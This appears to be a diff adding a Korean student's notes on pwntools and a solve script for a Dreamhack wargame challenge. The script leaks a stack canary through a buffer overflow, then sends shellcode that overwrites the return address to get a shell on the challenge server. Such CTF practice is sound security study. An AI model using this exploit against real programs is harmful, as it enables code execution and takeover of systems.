@@ -1,0 +1,45 @@
+pwntools 사용법
+process: 실행파일의 변수를 선언  # r = process("파일명")
+recv(): 출력돼는 문자열의 몇바이트만큼 보여줄것인지 # r.recv(5) 5바이트만큼 stdout
+recvuntil("문자열"): 출력돼는것중 문자열까지만 출력 stdout
+recvn: recv(인자)와 다르게 인자만큼 출력이 안돼면 기다림
+recvline: 출력돼는 문자열을 반환  # r.recvline
+remote : 원격주소로 가는 것 # nc "주소" 포트 -> p = remote("주소", 포트)
+
+블로그 : https://blog.naver.com/qkrwodn8235/222780554802
+
+----- 
+from pwn import *
+
+def slog(n, m): return success("".join([n, hex(m)]))  #success 함수를 모르겠음
+#join은 문자열리스트를 합쳐주는 것
+
+p = remote("host3.dreamhack.games", 19231)  #해당 게임으로 들어가고
+
+context.arch = "amd64"   #64비트 아키텍처로
+
+p.recvuntil("buf: ")   
+buf = int(p.recvline()[:-1], 16)
+slog("Address of buf", buf)
+
+p.recvuntil("$rbp: ")
+
+buf2sfp = int(p.recvline().split()[0])  #쪼개는 것 구분하고 그 뒤에를 vuf2sfp에 저장
+buf2cnry = buf2sfp - 8  #buf/sfp/canary/ret
+
+slog("buf <=> sfp", buf2sfp)
+slog("vuf <=> canary", buf2cnry)
+
+payload = b"A"*(buf2cnry +1) # 왜냐하면 buf뒤에 null값이 있으니깐
+
+p.sendafter("Input:", payload)
+p.recvuntil(payload)
+cnry = u64(b"\x00"+p.recvn(7))
+slog("Canary", cnry)
+
+sh = asm(shellcraft.sh())
+payload = sh.ljust(buf2cnry, b"A") + p64(cnry) + b"B"*0x8 + p64(buf)
+
+p.sendlineafter("Input:", payload)
+
+p.interactive()
